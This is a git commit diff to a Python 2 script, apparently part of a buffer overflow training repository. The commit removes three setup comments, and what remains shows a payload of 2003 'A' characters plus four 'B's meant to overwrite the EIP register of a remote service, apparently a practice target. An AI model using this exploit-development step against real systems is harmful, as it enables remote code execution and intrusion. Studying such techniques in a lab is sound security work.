bd42fb367214547c257f90a3db0000e769c46061
Josh Giddings <75488156+giddings32@users.noreply.github.com>
2022-08-09 14:55:26 -0400

    Update 3_Overwrite_EIP.py

--- Buffer_Overflow/Remote_Buffer_Overflow/3_Overwrite_EIP.py
+++ Buffer_Overflow/Remote_Buffer_Overflow/3_Overwrite_EIP.py
@@ -1,9 +1,6 @@
 #!/usr/bin/python2
 import sys, socket
 
-# Change shellcode to Offset defined above on line 8
-# Change IP and Port on line 13 to Target and Port Application is running on
-# Change TRUN on line 14 to Command you are testing
 
 shellcode = "A" * 2003 + "B" * 4
 
